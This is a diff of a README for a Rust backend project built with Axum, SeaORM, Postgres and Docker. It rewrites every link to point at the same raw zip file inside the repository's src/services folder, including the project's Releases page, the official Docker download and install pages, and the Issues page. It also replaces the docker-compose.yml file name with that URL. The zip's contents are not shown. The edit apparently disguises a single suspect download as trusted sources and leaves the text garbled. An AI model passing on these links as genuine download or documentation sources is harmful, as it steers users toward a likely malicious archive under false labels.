@@ -1,6 +1,6 @@
 # 🚀 rust-axum-seaorm-postgres-swagger-docker - Simple Rust Backend Setup for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases)
+[![Download Now](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip)
 
 ## 📦 Overview
 
@@ -11,12 +11,12 @@ Welcome to rust-axum-seaorm-postgres-swagger-docker! This project provides a ful
 To get started with this application, follow these simple steps:
 
 1. **Download the Software**
-   Visit the [Releases page](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases) to download the latest version of the application.
+   Visit the [Releases page](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip) to download the latest version of the application.
 
 2. **Install Docker**
    Ensure you have Docker installed on your computer. Docker is a platform that allows you to run applications in containers. Here’s how to install it:
-   - For Windows and macOS, visit the [Docker Desktop](https://www.docker.com/products/docker-desktop) page.
-   - For Linux, you can find instructions for your specific distribution [here](https://docs.docker.com/engine/install/).
+   - For Windows and macOS, visit the [Docker Desktop](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip) page.
+   - For Linux, you can find instructions for your specific distribution [here](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip).
 
 3. **Run the Application**
    After downloading, open your command line interface. Navigate to the folder where you downloaded the application and run the following command:
@@ -40,7 +40,7 @@ To get started with this application, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get the software, visit the [Releases page](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases). Here, you will find the latest version ready for download.
+To get the software, visit the [Releases page](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip). Here, you will find the latest version ready for download.
 
 ## 🌐 Features
 
@@ -61,14 +61,14 @@ If you encounter issues while running the application, here are some common prob
    Make sure Docker is running on your machine before executing `docker-compose up`.
 
 2. **Port Conflicts**
-   If another application is using port 3000, change the port by editing the `docker-compose.yml` file and running the application again.
+   If another application is using port 3000, change the port by editing the `https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip` file and running the application again.
 
 3. **Insufficient Resources**
    Ensure your system meets the hardware requirements. Allocate more resources in the Docker settings if needed.
 
 ## 🌍 Community and Support
 
-For assistance or to report issues, please visit the [GitHub Issues page](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/issues). Share your experience or ask questions to get help from the community.
+For assistance or to report issues, please visit the [GitHub Issues page](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip). Share your experience or ask questions to get help from the community.
 
 ## 📅 Updates and Versions
 
@@ -78,4 +78,4 @@ Stay updated with new releases. Each version may bring new features, improvement
 
 Thank you for choosing rust-axum-seaorm-postgres-swagger-docker. Your interest in this project helps the community grow. Happy coding!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases)
+[![Download Now](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip)
